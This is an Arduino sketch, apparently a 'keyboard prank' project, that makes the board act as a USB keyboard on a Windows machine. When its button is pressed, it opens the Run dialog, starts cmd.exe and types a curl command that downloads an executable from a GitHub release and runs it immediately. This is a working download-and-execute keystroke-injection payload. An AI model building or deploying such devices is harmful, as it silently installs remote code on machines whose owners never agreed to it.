// ---------------------------------------------------
// nico78
// scancode keyboard qwerty et correspondance azerty
// ---------------------------------------------------
//  ' ' est le symbole qui désigne un espace, il a la valeur 44
//  Alt Gr azerty                   €                                                                    ~  #  {  [  |  `  \  ^  @    ' '  ]  }  ¤       
//   Shift azerty       Q  B  C  D  E  F  G  H  I  J  K  L  ?  N  O  P  A  R  S  T  U  V  Z  X  Y  W  1  2  3  4  5  6  7  8  9  0    ' '  °  +  ¨  £  µ  No fr  M  %  NONE  .  /  §    >
//         azerty       q  b  c  d  e  f  g  h  i  j  k  l  ,  n  o  p  a  r  s  t  u  v  z  x  y  w  &  é  "  '  (  -  è  _  ç  à    ' '  )  =  ^  $  *  No fr  m  ù   ²    ;  :  !    <
//         qwerty       a  b  c  d  e  f  g  h  i  j  k  l  m  n  o  p  q  r  s  t  u  v  w  x  y  z  1  2  3  4  5  6  7  8  9  0    ' '  -  =  [  ]  \  No US  ;  '   `    ,  .  /   No US      
//       scancode       4, 5, 6, 7, 8, 9, 10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,  44, 45,46,47,48,49,  50,  51,52, 53,  54,55,56,  100}; 


#include "Keyboard.h"

// Declaring button pin
const int buttonPin = 9;

int previousButtonState = HIGH;

void KeyPress(char key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
  delay(50);
}

void KeyPressSpecial(char key, char key2) {
  Keyboard.press(key);
  Keyboard.press(key2);
  delay(50);
  Keyboard.releaseAll();
  delay(50);
}

void setup() {
  // Declare the button as input_pullup
  pinMode(buttonPin, INPUT_PULLUP);
  Keyboard.begin(KeyboardLayout_fr_FR);
}

void loop() {
  // Read the current state of the button
  int buttonState = digitalRead(buttonPin);
  
  // Check if the button is pressed (LOW state due to INPUT_PULLUP)
  if (buttonState == LOW && previousButtonState == HIGH) {
    // Perform the key press when button is pressed
    //KeyPress('q');
    Keyboard.press(KEY_LEFT_GUI);
    KeyPressSpecial(131, 'r');
    delay(150);
    Keyboard.print("cmd.exe");
    delay(150);
    Keyboard.write(KEY_KP_ENTER);
    delay(150);
    Keyboard.print("curl -L https://github.com/IvnoGood/Keyboard-Prank/releases/download/release/keyboard.exe --output keyboard.exe && start keyboard.exe && exit"); 
    delay(150);
    Keyboard.write(KEY_KP_ENTER);
  }

  // Update the previous button state
  previousButtonState = buttonState;
}
